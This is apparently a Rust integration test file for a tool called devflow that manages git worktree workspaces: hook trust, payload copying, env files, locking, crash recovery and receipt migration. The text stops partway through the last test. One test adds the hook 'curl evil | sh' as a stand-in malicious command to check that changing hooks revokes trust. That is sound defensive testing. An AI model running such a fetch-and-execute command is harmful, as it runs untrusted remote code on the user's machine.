//! Workspace lifecycle against real Git repositories in temporary directories.
//! Tests that need Docker or pitchfork are `#[ignore]`d.
use devflow_core::config::Config;
use devflow_core::db::DataSource;
use devflow_core::error::{Busy, Protected};
use devflow_core::receipt::{DataBinding, Phase, PhaseState, Receipt, ServiceBinding, Status};
use devflow_core::setup::{
    self, CreateRequest, NoProgress, Progress, RemoveOptions, SetupOptions, SetupOutcome,
};
use devflow_core::worktree::{self, Workspace};
use devflow_core::{Project, cow, env_file, trust};
use std::path::{Path, PathBuf};
use std::sync::{Once, OnceLock};

/// Process-wide state directories. Every test uses its own random project id,
/// so sharing one trust file does not couple tests.
fn init() -> &'static Path {
    static ONCE: Once = Once::new();
    static DIR: OnceLock<tempfile::TempDir> = OnceLock::new();
    ONCE.call_once(|| {
        let dir = DIR.get_or_init(|| tempfile::tempdir().unwrap());
        // SAFETY: runs once, before any test body touches the environment.
        unsafe {
            std::env::set_var("DEVFLOW_CONFIG_DIR", dir.path().join("config"));
            std::env::set_var("DEVFLOW_DATA_DIR", dir.path().join("data"));
            std::env::set_var("PITCHFORK_STATE_DIR", dir.path().join("pf-state"));
            std::env::set_var("PITCHFORK_CONFIG_DIR", dir.path().join("pf-config"));
            std::env::set_var("PITCHFORK_LOGS_DIR", dir.path().join("pf-logs"));
            // A child test process (see `in_child`) is started with these set.
            if std::env::var_os(CHILD).is_none() {
                std::env::remove_var("DEVFLOW_TRUST_HOOKS");
                std::env::remove_var("DEVFLOW_INSTANCE_ID");
            }
        }
    });
    DIR.get().unwrap().path()
}

const CHILD: &str = "DEVFLOW_TEST_CHILD";

/// Environment variables are process-wide, so a test about one runs alone in a
/// child process started with it set instead of changing the environment of
/// the tests running beside it. Returns `true` inside the child (run the test
/// body); in the parent it runs the child and asserts that it passed.
fn in_child(test: &str, env: &[(&str, &str)]) -> bool {
    if std::env::var_os(CHILD).is_some() {
        return true;
    }
    let output = std::process::Command::new(std::env::current_exe().unwrap())
        .args([test, "--exact", "--nocapture", "--test-threads=1"])
        .envs(env.iter().copied())
        .env(CHILD, "1")
        .output()
        .unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        output.status.success() && stdout.contains("1 passed"),
        "child run of {test} failed:\n{stdout}\n{stderr}"
    );
    false
}

/// The binding under `services.db`, which every test project uses.
fn binding(receipt: &Receipt) -> ServiceBinding {
    receipt
        .services
        .get("db")
        .cloned()
        .unwrap_or_else(|| panic!("no services.db binding in {:?}", receipt.services))
}

/// A pitchfork with nothing running, for removals of workspaces that carry
/// pitchfork files the test is not about: a removal asks the pitchfork it
/// finds, and the one on this machine's `PATH` (a shim that does not run, say)
/// is not this test's business.
fn quiet_pitchfork() -> devflow_core::pitchfork::Pitchfork {
    static DIR: OnceLock<tempfile::TempDir> = OnceLock::new();
    let dir = DIR.get_or_init(|| {
        let dir = tempfile::tempdir().unwrap();
        let script = dir.path().join("pitchfork");
        std::fs::write(
            &script,
            include_str!("../../../tests/support/fake-pitchfork.sh"),
        )
        .unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        dir
    });
    devflow_core::pitchfork::Pitchfork::at(dir.path().join("pitchfork"))
}

fn protection(error: &anyhow::Error) -> &Protected {
    error
        .downcast_ref::<Protected>()
        .unwrap_or_else(|| panic!("not a typed refusal: {error:#}"))
}

/// Records progress callbacks.
#[derive(Default)]
struct Recorder {
    phases: Vec<(Phase, PhaseState)>,
    lines: Vec<String>,
}

impl Progress for Recorder {
    fn phase(&mut self, phase: Phase, state: PhaseState, _: Option<&str>) {
        self.phases.push((phase, state));
    }
    fn output(&mut self, line: &str) {
        self.lines.push(line.to_string());
    }
}

struct Repo {
    _dir: tempfile::TempDir,
    root: PathBuf,
    project: Project,
}

#[derive(Default)]
struct Hooks<'a> {
    setup: &'a [&'a str],
    switch: &'a [&'a str],
    teardown: &'a [&'a str],
}

fn toml_list(items: &[&str]) -> String {
    let items: Vec<_> = items
        .iter()
        .map(|s| {
            assert!(!s.contains('\''), "test commands avoid single quotes");
            format!("'{s}'")
        })
        .collect();
    format!("[{}]", items.join(", "))
}

fn config_text(hooks: &Hooks, extra: &str) -> String {
    format!(
        "[project]\nname = \"shop\"\nid = \"{}\"\n\n[worktree]\ncopy = [\".env\", \"node_modules\"]\n\n\
         [hooks]\nsetup = {}\nswitch = {}\nteardown = {}\n\n{extra}",
        uuid::Uuid::new_v4(),
        toml_list(hooks.setup),
        toml_list(hooks.switch),
        toml_list(hooks.teardown),
    )
}

fn commit_all(repo: &git2::Repository, message: &str) {
    let mut index = repo.index().unwrap();
    index
        .add_all(["*"], git2::IndexAddOption::DEFAULT, None)
        .unwrap();
    index.write().unwrap();
    let tree = repo.find_tree(index.write_tree().unwrap()).unwrap();
    let parent = repo.head().ok().and_then(|h| h.peel_to_commit().ok());
    let parents: Vec<_> = parent.iter().collect();
    let sig = git2::Signature::now("Test", "test@example.com").unwrap();
    repo.commit(Some("HEAD"), &sig, &sig, message, &tree, &parents)
        .unwrap();
}

/// A repository `shop` on `main` with a committed `devflow.toml`, plus an
/// ignored `.env` and `node_modules` in the main checkout.
fn repo(hooks: &Hooks, extra: &str) -> Repo {
    init();
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().canonicalize().unwrap().join("shop");
    std::fs::create_dir_all(&root).unwrap();
    let mut options = git2::RepositoryInitOptions::new();
    options.initial_head("main");
    let git = git2::Repository::init_opts(&root, &options).unwrap();
    std::fs::write(root.join("devflow.toml"), config_text(hooks, extra)).unwrap();
    std::fs::write(
        root.join(".gitignore"),
        ".env\nnode_modules/\ndevflow.local.toml\n",
    )
    .unwrap();
    std::fs::write(root.join("README.md"), "shop\n").unwrap();
    commit_all(&git, "initial");
    std::fs::write(root.join(".env"), "SECRET=1\n").unwrap();
    std::fs::create_dir_all(root.join("node_modules/pkg")).unwrap();
    std::fs::write(
        root.join("node_modules/pkg/index.js"),
        "module.exports = 1;\n",
    )
    .unwrap();
    let project = Project::open(&root).unwrap();
    Repo {
        _dir: dir,
        root,
        project,
    }
}

fn plain() -> Repo {
    repo(&Hooks::default(), "")
}

fn create(project: &Project, name: &str, options: SetupOptions) -> anyhow::Result<SetupOutcome> {
    setup::create(
        project,
        CreateRequest {
            name: name.into(),
            from: None,
            options,
        },
        &mut NoProgress,
    )
}

fn trusted(project: &Project) -> SetupOptions {
    SetupOptions {
        approval: Some(trust::Approval::of(&trust::scope(project))),
        ..Default::default()
    }
}

fn receipt_of(ws: &Workspace) -> Receipt {
    Receipt::load(&ws.git_dir).unwrap().expect("receipt")
}

fn ws(project: &Project, name: &str) -> Workspace {
    worktree::find(project, name)
        .unwrap()
        .unwrap_or_else(|| panic!("no workspace {name}"))
}

fn env_map(ws: &Workspace) -> std::collections::HashMap<String, String> {
    env_file::read(&ws.path).unwrap().into_iter().collect()
}

#[test]
fn create_clones_payload_writes_env_and_runs_trusted_hooks() {
    let t = repo(
        &Hooks {
            setup: &[
                "echo \"$DEVFLOW_WORKSPACE|$DEVFLOW_PHASE|$DEVFLOW_SETUP_ACTIVE|$DEVFLOW_WORKSPACE_ID|$DEVFLOW_SOURCE_PATH|$DEVFLOW_PROJECT_ROOT\" > .devflow/marker",
                "echo second >> .devflow/marker",
            ],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let mut rec = Recorder::default();
    let out = setup::create(
        &t.project,
        CreateRequest {
            name: "feature/a".into(),
            from: None,
            options: SetupOptions::default(),
        },
        &mut rec,
    )
    .unwrap();

    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    let w = &out.workspace;
    assert_eq!(w.name, "feature/a");
    assert!(w.path.ends_with("shop.worktrees/feature-a"));
    assert!(
        !worktree::is_dirty(w).unwrap(),
        "payload and .devflow are ignored"
    );

    // Payload: both entries cloned from the main checkout.
    assert_eq!(out.payload.len(), 2);
    assert!(
        out.payload
            .iter()
            .all(|e| matches!(e.result, cow::EntryResult::Done { .. }))
    );
    assert_eq!(
        std::fs::read_to_string(w.path.join(".env")).unwrap(),
        "SECRET=1\n"
    );
    assert_eq!(
        std::fs::read_to_string(w.path.join("node_modules/pkg/index.js")).unwrap(),
        "module.exports = 1;\n"
    );

    // Env file: private, with the DEVFLOW_* identity and no database entries.
    let env = env_map(w);
    assert_eq!(env["DEVFLOW_PROJECT"], "shop");
    assert_eq!(env["DEVFLOW_WORKSPACE"], "feature/a");
    assert_eq!(env["DEVFLOW_WORKSPACE_PATH"], w.path.display().to_string());
    assert_eq!(env["DEVFLOW_PROJECT_ROOT"], t.root.display().to_string());
    assert_eq!(env["DEVFLOW_SOURCE_PATH"], t.root.display().to_string());
    assert_eq!(
        env["DEVFLOW_WORKSPACE_ID"],
        out.receipt.instance_id.to_string()
    );
    assert!(
        !env.contains_key("DEVFLOW_INSTANCE_ID"),
        "the override's name is never exported: sourcing the file must not set it"
    );
    assert!(!env.contains_key("DATABASE_URL"));
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = env_file::path(&w.path)
            .metadata()
            .unwrap()
            .permissions()
            .mode();
        assert_eq!(mode & 0o777, 0o600);
        let mode = Receipt::path(&w.git_dir)
            .metadata()
            .unwrap()
            .permissions()
            .mode();
        assert_eq!(mode & 0o777, 0o600);
    }

    // Hooks ran in order, in the worktree, with the environment.
    let marker = std::fs::read_to_string(w.path.join(".devflow/marker")).unwrap();
    let mut lines = marker.lines();
    assert_eq!(
        lines.next().unwrap(),
        format!(
            "feature/a|setup|1|{}|{}|{}",
            out.receipt.instance_id,
            t.root.display(),
            t.root.display()
        )
    );
    assert_eq!(lines.next(), Some("second"));
    let report = out.hooks.as_ref().unwrap();
    assert!(report.ok && report.runs.len() == 2);
    let log = report.log.as_ref().unwrap();
    assert!(log.starts_with(Receipt::logs_dir(&w.git_dir)));
    assert!(
        std::fs::read_to_string(log)
            .unwrap()
            .contains("$ echo second")
    );
    assert!(rec.lines.iter().any(|l| l.starts_with("$ echo second")));

    // Receipt: identical on disk, every phase recorded, digest pinned.
    assert_eq!(receipt_of(w), out.receipt);
    assert_eq!(out.receipt.code_source.as_deref(), Some("main"));
    assert_eq!(out.receipt.project_id, t.project.id());
    assert_eq!(out.receipt.hooks_digest, Some(trust::digest(&t.project)));
    assert_eq!(
        out.receipt.phase(Phase::Services).state,
        PhaseState::Skipped
    );
    assert!(!out.receipt.phase(Phase::Services).required_skip);
    assert_eq!(
        rec.phases,
        vec![
            (Phase::Materialize, PhaseState::Started),
            (Phase::Materialize, PhaseState::Done),
            (Phase::Payload, PhaseState::Started),
            (Phase::Payload, PhaseState::Done),
            (Phase::Services, PhaseState::Started),
            (Phase::Services, PhaseState::Skipped),
            (Phase::Env, PhaseState::Started),
            (Phase::Env, PhaseState::Done),
            (Phase::Hooks, PhaseState::Started),
            (Phase::Hooks, PhaseState::Done),
        ]
    );

    // Listing: default is not set up, the new workspace is ready and idle.
    let list = setup::list(&t.project).unwrap();
    assert_eq!(list.len(), 2);
    assert!(list[0].workspace.is_default && list[0].status.is_none());
    assert_eq!(list[1].status, Some(Status::Ready));
    assert!(!list[1].busy);

    // Creating it again is an error; the existing workspace is untouched.
    let error = create(&t.project, "feature/a", SetupOptions::default()).unwrap_err();
    assert!(error.to_string().contains("already exists"), "{error:#}");
    assert!(create(&t.project, "main", SetupOptions::default()).is_err());
}

#[test]
fn create_from_another_workspace_copies_its_payload() {
    let t = repo(&Hooks::default(), "");
    let a = create(&t.project, "a", SetupOptions::default())
        .unwrap()
        .workspace;
    std::fs::write(a.path.join(".env"), "SECRET=changed-in-a\n").unwrap();
    let out = setup::create(
        &t.project,
        CreateRequest {
            name: "b".into(),
            from: Some("a".into()),
            options: SetupOptions::default(),
        },
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(out.receipt.code_source.as_deref(), Some("a"));
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".env")).unwrap(),
        "SECRET=changed-in-a\n"
    );
    assert_eq!(
        env_map(&out.workspace)["DEVFLOW_SOURCE_PATH"],
        a.path.display().to_string()
    );
    assert!(
        setup::create(
            &t.project,
            CreateRequest {
                name: "c".into(),
                from: Some("nope".into()),
                options: SetupOptions::default()
            },
            &mut NoProgress,
        )
        .is_err()
    );
    assert!(
        worktree::find(&t.project, "c").unwrap().is_none(),
        "nothing created for an unknown source"
    );
}

#[test]
fn untrusted_hooks_need_attention_until_approved_then_setup_resumes() {
    let t = repo(
        &Hooks {
            setup: &["echo ran > .devflow/marker"],
            ..Default::default()
        },
        "",
    );
    let out = create(&t.project, "feature", SetupOptions::default()).unwrap();
    assert_eq!(out.status, Status::NeedsAttention);
    let w = out.workspace.clone();
    let hooks = out.receipt.phase(Phase::Hooks);
    assert_eq!(hooks.state, PhaseState::Skipped);
    assert!(hooks.required_skip);
    assert!(hooks.detail.unwrap().contains("approve"));
    assert!(out.hooks.is_none());
    assert!(!w.path.join(".devflow/marker").exists());
    // Everything before the hooks is in place.
    assert!(w.path.join(".env").is_file());
    assert!(env_file::path(&w.path).is_file());
    assert_eq!(
        setup::list(&t.project).unwrap()[1].status,
        Some(Status::NeedsAttention)
    );

    // `create` on the same name resumes instead of failing; still untrusted.
    let again = create(&t.project, "feature", SetupOptions::default()).unwrap();
    assert_eq!(again.status, Status::NeedsAttention);
    assert!(again.payload.is_empty(), "payload is not repeated");

    // `--if-new` resumes an incomplete receipt as well.
    assert!(
        setup::setup(
            &t.project,
            &w,
            SetupOptions::default(),
            true,
            false,
            &mut NoProgress
        )
        .unwrap()
        .is_some()
    );

    trust::approve(&t.project).unwrap();
    let mut rec = Recorder::default();
    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut rec,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(out.payload.is_empty());
    assert_eq!(
        rec.phases,
        vec![
            (Phase::Hooks, PhaseState::Started),
            (Phase::Hooks, PhaseState::Done)
        ]
    );
    assert_eq!(
        std::fs::read_to_string(w.path.join(".devflow/marker")).unwrap(),
        "ran\n"
    );

    // Now it is complete: `--if-new` does nothing, and so does a plain re-run.
    assert!(
        setup::setup(
            &t.project,
            &w,
            SetupOptions::default(),
            true,
            false,
            &mut NoProgress
        )
        .unwrap()
        .is_none()
    );
    let rerun = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut rec,
    )
    .unwrap()
    .unwrap();
    assert_eq!(rerun.status, Status::Ready);
    assert_eq!(rec.phases.len(), 2, "no phase ran again");
    assert!(create(&t.project, "feature", SetupOptions::default()).is_err());
}

#[test]
fn changing_the_hooks_revokes_trust() {
    let t = repo(
        &Hooks {
            setup: &["true"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    assert_eq!(
        trust::state(&t.project).unwrap(),
        trust::TrustState::Trusted
    );
    let mut changed = t.project.clone();
    changed.config.hooks.setup.push("curl evil | sh".into());
    let out = create(&changed, "feature", SetupOptions::default()).unwrap();
    assert_eq!(out.status, Status::NeedsAttention);
    match trust::state(&changed).unwrap() {
        trust::TrustState::Untrusted {
            previously_trusted, ..
        } => assert!(previously_trusted),
        other => panic!("{other:?}"),
    }
}

#[test]
fn trust_option_runs_untrusted_hooks_for_one_run_only() {
    let t = repo(
        &Hooks {
            setup: &["echo ok > .devflow/marker"],
            ..Default::default()
        },
        "",
    );
    let out = create(&t.project, "ci", trusted(&t.project)).unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(out.workspace.path.join(".devflow/marker").is_file());
    assert!(matches!(
        trust::state(&t.project).unwrap(),
        trust::TrustState::Untrusted { .. }
    ));
}

#[test]
fn no_hooks_flag_skips_without_needing_attention() {
    let t = repo(
        &Hooks {
            setup: &["touch .devflow/never"],
            ..Default::default()
        },
        "",
    );
    let out = create(
        &t.project,
        "quick",
        SetupOptions {
            no_hooks: true,
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(!out.workspace.path.join(".devflow/never").exists());
}

#[test]
fn a_failing_hook_is_reported_in_the_outcome_and_retried_on_resume() {
    let t = repo(
        &Hooks {
            setup: &["echo before", "echo boom; exit 7", "touch .devflow/after"],
            ..Default::default()
        },
        "",
    );
    let out = create(&t.project, "broken", trusted(&t.project)).unwrap();
    assert_eq!(out.status, Status::NeedsAttention);
    let report = out.hooks.as_ref().unwrap();
    assert!(!report.ok);
    assert_eq!(report.runs.len(), 2);
    assert_eq!(report.runs[1].exit_code, Some(7));
    assert!(!out.workspace.path.join(".devflow/after").exists());
    let phase = out.receipt.phase(Phase::Hooks);
    assert_eq!(phase.state, PhaseState::Failed);
    assert!(phase.detail.unwrap().contains("exit 7"));
    assert!(
        std::fs::read_to_string(report.log.as_ref().unwrap())
            .unwrap()
            .contains("boom")
    );

    // Fix the hooks and resume.
    let mut fixed = t.project.clone();
    fixed.config.hooks.setup = vec!["touch .devflow/fixed".into()];
    let out = setup::setup(
        &fixed,
        &out.workspace,
        trusted(&fixed),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(out.workspace.path.join(".devflow/fixed").is_file());
}

#[test]
fn hook_timeout_marks_the_workspace_needing_attention() {
    let t = repo(
        &Hooks {
            setup: &["sleep 60"],
            ..Default::default()
        },
        "",
    );
    let mut project = t.project.clone();
    project.config.hooks.timeout = "300ms".into();
    let started = std::time::Instant::now();
    let out = create(&project, "slow", trusted(&project)).unwrap();
    assert!(started.elapsed() < std::time::Duration::from_secs(10));
    assert_eq!(out.status, Status::NeedsAttention);
    assert!(out.hooks.unwrap().runs[0].timed_out);
    assert!(
        out.receipt
            .phase(Phase::Hooks)
            .detail
            .unwrap()
            .contains("timed out")
    );
}

#[test]
fn resume_after_a_simulated_crash_completes_the_remaining_phases() {
    let t = repo(
        &Hooks {
            setup: &["echo done > .devflow/marker"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    // The process died right after recording `payload: started`.
    let w = worktree::create(&t.project, "crashed", None).unwrap();
    let mut receipt = Receipt::new(t.project.id(), "crashed", Some("main".into()));
    receipt.set_phase(Phase::Materialize, PhaseState::Done, None);
    receipt.set_phase(Phase::Payload, PhaseState::Started, None);
    receipt.save(&w.git_dir).unwrap();
    assert!(!w.path.join(".env").exists());
    assert_eq!(
        setup::list(&t.project).unwrap()[1].status,
        Some(Status::InProgress)
    );

    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert_eq!(
        out.receipt.instance_id, receipt.instance_id,
        "identity survives a resume"
    );
    assert!(w.path.join(".env").is_file());
    assert!(w.path.join("node_modules/pkg/index.js").is_file());
    assert!(w.path.join(".devflow/marker").is_file());

    // A crash in the middle of the hooks phase re-runs the hooks (at least once).
    let mut receipt = receipt_of(&w);
    receipt.set_phase(Phase::Hooks, PhaseState::Started, None);
    receipt.save(&w.git_dir).unwrap();
    std::fs::remove_file(w.path.join(".devflow/marker")).unwrap();
    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(w.path.join(".devflow/marker").is_file());
}

#[test]
fn a_running_setup_blocks_a_second_one() {
    let t = plain();
    let w = worktree::create(&t.project, "busy", None).unwrap();
    let held = Receipt::try_lock(&w.git_dir).unwrap().unwrap();
    // A receipt must exist for the list to report the workspace.
    let mut receipt = Receipt::new(t.project.id(), "busy", None);
    receipt.set_phase(Phase::Materialize, PhaseState::Done, None);
    receipt.save(&w.git_dir).unwrap();

    let error = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap_err();
    let busy = error.downcast_ref::<Busy>().expect("typed busy error");
    assert_eq!(busy.workspace, "busy");
    // `--if-new` with nothing ready must not look like success: the workspace
    // is not set up yet, only someone else is setting it up.
    let error = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        true,
        false,
        &mut NoProgress,
    )
    .unwrap_err();
    assert_eq!(
        error
            .downcast_ref::<Busy>()
            .expect("typed busy error, not a silent skip")
            .workspace,
        "busy"
    );
    let listed = setup::list(&t.project).unwrap();
    assert!(listed[1].busy);
    assert_eq!(listed[1].status, Some(Status::InProgress));
    // Removal also waits for the running setup.
    let error = setup::remove(
        &t.project,
        "busy",
        RemoveOptions {
            force: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap_err();
    assert_eq!(error.downcast_ref::<Busy>().unwrap().workspace, "busy");
    assert!(w.path.exists());
    // Reset and creating over the running workspace report the same thing.
    let error = setup::reset_data(&t.project, &w, None).unwrap_err();
    assert!(error.downcast_ref::<Busy>().is_some(), "{error:#}");
    let error = create(&t.project, "busy", SetupOptions::default()).unwrap_err();
    assert!(error.downcast_ref::<Busy>().is_some(), "{error:#}");

    drop(held);
    assert!(
        setup::setup(
            &t.project,
            &w,
            SetupOptions::default(),
            false,
            false,
            &mut NoProgress
        )
        .is_ok()
    );
}

#[test]
fn if_new_skips_a_ready_workspace_even_while_it_is_locked_but_not_an_unready_one() {
    let t = plain();
    // A ready receipt written directly: a finished `create` can leave its lock
    // file descriptor open in a process another test thread has just spawned,
    // and this test must be able to take the lock at once.
    let w = worktree::create(&t.project, "ready", None).unwrap();
    let mut done = Receipt::new(t.project.id(), "ready", None);
    for phase in Phase::ALL {
        done.set_phase(phase, PhaseState::Done, None);
    }
    done.save(&w.git_dir).unwrap();
    assert_eq!(done.status(), Status::Ready);
    let held = Receipt::try_lock(&w.git_dir).unwrap().unwrap();
    let if_new = |w: &Workspace| {
        setup::setup(
            &t.project,
            w,
            SetupOptions::default(),
            true,
            false,
            &mut NoProgress,
        )
    };
    assert!(
        if_new(&w).unwrap().is_none(),
        "ready: nothing to do, whoever holds the lock"
    );

    // No receipt at all (a worktree another tool made): busy, not skipped.
    let raw = worktree::create(&t.project, "raw", None).unwrap();
    let held_raw = Receipt::try_lock(&raw.git_dir).unwrap().unwrap();
    let error = if_new(&raw).unwrap_err();
    assert!(error.downcast_ref::<Busy>().is_some(), "{error:#}");
    assert!(
        Receipt::load(&raw.git_dir).unwrap().is_none(),
        "nothing written"
    );
    drop((held, held_raw));
    assert!(if_new(&raw).unwrap().is_some(), "free again: it is adopted");
}

#[test]
fn if_new_adopts_worktrees_made_by_other_tools_and_then_does_nothing() {
    let t = repo(
        &Hooks {
            setup: &["echo adopted > .devflow/marker"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    // `git worktree add` equivalent: a worktree without any devflow state.
    let w = worktree::create(&t.project, "by-agent", None).unwrap();
    assert!(Receipt::load(&w.git_dir).unwrap().is_none());
    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        true,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .expect("adopted");
    assert_eq!(out.status, Status::Ready);
    assert_eq!(
        out.receipt.code_source, None,
        "adopted worktrees use the default workspace"
    );
    assert_eq!(out.receipt.workspace, "by-agent");
    assert!(
        w.path.join(".env").is_file(),
        "payload comes from the default workspace"
    );
    assert_eq!(
        env_map(&w)["DEVFLOW_SOURCE_PATH"],
        t.root.display().to_string()
    );
    assert!(w.path.join(".devflow/marker").is_file());
    assert!(
        setup::setup(
            &t.project,
            &w,
            SetupOptions::default(),
            true,
            false,
            &mut NoProgress
        )
        .unwrap()
        .is_none()
    );
}

#[test]
fn a_receipt_from_another_project_is_refused_not_adopted() {
    let t = plain();
    let w = worktree::create(&t.project, "foreign", None).unwrap();
    let mut receipt = Receipt::new(uuid::Uuid::new_v4(), "foreign", None);
    receipt.set_phase(Phase::Materialize, PhaseState::Done, None);
    receipt.save(&w.git_dir).unwrap();
    let error = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(error.to_string().contains("another project"), "{error:#}");
    assert!(!w.path.join(".env").exists(), "nothing ran");
    // Listing ignores it.
    assert_eq!(setup::list(&t.project).unwrap()[1].status, None);
    // The foreign receipt is left alone when removing: no data or hooks are touched.
    let out = setup::remove(
        &t.project,
        "foreign",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert!(
        out.warnings.iter().any(|w| w.contains("another project")),
        "{:?}",
        out.warnings
    );
    assert!(!w.path.exists());
}

#[test]
fn new_instance_gives_a_fork_a_fresh_identity_and_forgets_the_copied_binding() {
    let t = repo(
        &Hooks {
            setup: &["echo \"$DEVFLOW_WORKSPACE_ID\" > .devflow/marker"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let out = create(&t.project, "vm", SetupOptions::default()).unwrap();
    let w = out.workspace.clone();
    let old_instance = out.receipt.instance_id;
    // Pretend the original instance had been bound to a database branch.
    let branch = uuid::Uuid::new_v4();
    let mut copied = receipt_of(&w);
    copied.data_source = Some("workspace:main".into());
    copied.services.insert(
        "db".into(),
        ServiceBinding::postgres(
            DataBinding {
                branch_id: Some(branch),
                database: "df_a_b".into(),
                role: "dfl_b".into(),
                url: "postgres://dfl_b:pw@old-host:5432/df_a_b".into(), // kingfisher:ignore
                source: "workspace:main".into(),
                owned: true,
            },
            None,
        ),
    );
    copied.save(&w.git_dir).unwrap();
    std::fs::remove_file(w.path.join(".devflow/marker")).unwrap();

    let mut rec = Recorder::default();
    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        true,
        &mut rec,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert_ne!(out.receipt.instance_id, old_instance);
    assert!(
        out.receipt.services.is_empty(),
        "the copied binding lost its authority"
    );
    assert_eq!(
        out.receipt.data_source,
        Some(format!("branch:{branch}")),
        "the new branch would clone the previous one"
    );
    // Database, env and hooks ran again; code phases did not.
    let phases: Vec<_> = rec
        .phases
        .iter()
        .filter(|(_, s)| *s == PhaseState::Started)
        .map(|(p, _)| *p)
        .collect();
    assert_eq!(phases, vec![Phase::Services, Phase::Env, Phase::Hooks]);
    assert!(out.payload.is_empty());
    // Without a postgres service there is nothing to provision: no stale DATABASE_URL.
    assert!(!env_map(&w).contains_key("DATABASE_URL"));
    assert_eq!(
        env_map(&w)["DEVFLOW_WORKSPACE_ID"],
        out.receipt.instance_id.to_string()
    );
    assert_eq!(
        std::fs::read_to_string(w.path.join(".devflow/marker"))
            .unwrap()
            .trim(),
        out.receipt.instance_id.to_string()
    );
    assert_eq!(receipt_of(&w), out.receipt);

    // `--data-from` overrides the recorded choice.
    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions {
            data_from: Some(DataSource::Empty),
            ..Default::default()
        },
        false,
        true,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.receipt.data_source.as_deref(), Some("empty"));
}

/// Rewrite a workspace's receipt the way devflow 1.0 builds before receipt
/// version 2 wrote it: one `data` binding and a `database` phase.
fn downgrade_to_v1(ws: &Workspace) {
    let path = Receipt::path(&ws.git_dir);
    let mut doc: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
    let object = doc.as_object_mut().unwrap();
    object.insert("version".into(), 1.into());
    object.remove("env_generation");
    if let Some(services) = object.remove("services") {
        let mut data = services["db"].clone();
        let binding = data.as_object_mut().unwrap();
        binding.remove("engine");
        binding.remove("applied");
        object.insert("data".into(), data);
    }
    let phases = object["phases"].as_object_mut().unwrap();
    let record = phases.remove("services").unwrap();
    phases.insert("database".into(), record);
    std::fs::write(&path, serde_json::to_vec_pretty(&doc).unwrap()).unwrap();
}

#[test]
fn a_version_one_receipt_is_migrated_by_the_next_setup_which_rewrites_only_the_environment() {
    let t = repo(
        &Hooks {
            setup: &["echo run >> .devflow/runs"],
            ..Default::default()
        },
        "[services.db]\nengine = \"postgres\"\nmode = \"external\"\n",
    );
    trust::approve(&t.project).unwrap();
    let url = "postgres://dfl_x:pw@db.internal:6543/df_proj_x"; // kingfisher:ignore
    let out = create(
        &t.project,
        "old",
        SetupOptions {
            database_url: Some(url.into()),
            ..Default::default()
        },
    )
    .unwrap();
    let w = out.workspace.clone();
    let env_before = std::fs::read(w.path.join(".devflow/env")).unwrap();
    downgrade_to_v1(&w);
    // The file version 1 wrote did not know the compose project name.
    let old_vars: Vec<_> = env_file::read(&w.path)
        .unwrap()
        .into_iter()
        .filter(|(name, _)| name != "COMPOSE_PROJECT_NAME")
        .collect();
    env_file::write(&w.path, &old_vars).unwrap();
    assert!(!env_map(&w).contains_key("COMPOSE_PROJECT_NAME"));
    assert_eq!(Receipt::load(&w.git_dir).unwrap().unwrap().version, 1);

    // Reading migrates in memory only: the binding lands under the sole
    // postgres service, the file is untouched, and the workspace is not
    // claimed ready under an environment generation nothing was written under.
    let listed = &setup::list(&t.project).unwrap()[1];
    let seen = listed.receipt.as_ref().unwrap();
    assert_eq!(seen.version, 2);
    assert_eq!(seen.services["db"].url, url);
    assert_eq!(seen.env_generation, None);
    assert_eq!(listed.status, Some(Status::NeedsAttention));
    assert!(seen.phase(Phase::Env).required_skip);
    assert!(seen.phase(Phase::Hooks).required_skip);
    assert_eq!(Receipt::load(&w.git_dir).unwrap().unwrap().version, 1);

    // The next setup migrates the file under the lock and redoes the
    // environment and the hooks after it, and nothing else.
    let mut rec = Recorder::default();
    let again = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        true,
        false,
        &mut rec,
    );
